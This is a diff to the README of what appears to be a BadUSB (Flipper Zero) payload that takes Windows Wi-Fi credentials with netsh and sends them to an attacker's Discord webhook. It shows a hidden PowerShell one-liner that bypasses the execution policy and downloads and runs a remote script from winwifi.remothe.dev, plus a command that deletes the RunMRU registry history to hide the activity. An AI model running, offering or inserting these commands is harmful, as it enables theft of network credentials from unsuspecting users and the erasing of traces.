@@ -19,21 +19,20 @@ Then clears run history.
 * An internet connection
 * Windows 10,11
 
-### Executing program
-
-* Plug in your device
-* Invoke 2 netsh commands
-* Invoke-WebRequest will be entered in the Run Box to send the content
-* Invoke-powershell command to remove 'Run' history values from Registry
-
-ENG 🇺🇸
+# Usage
+Replace `https://discord.com/api/webhooks/<channel_id>/<webhook_id>` with your own [webhook url](https://support.discord.com/hc/en-us/articles/228383668-Intro-to-Webhooks).
+### Powershell
 ```powershell
 powershell -w h -ep bypass $discord='<your_webhook_here>';irm winwifi.remothe.dev | iex
 
 powershell "Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue" | iex
 ```
 
-You must put your Discord webhook into the variable $discord='\<your-webhook-here>'
+### Executing program | Flipper Zero
+* Plug in your device
+* Invoke 2 netsh commands
+* Invoke-WebRequest will be entered in the Run Box to send the content
+* Invoke-powershell command to remove 'Run' history values from Registry
 
 ## Credits
 
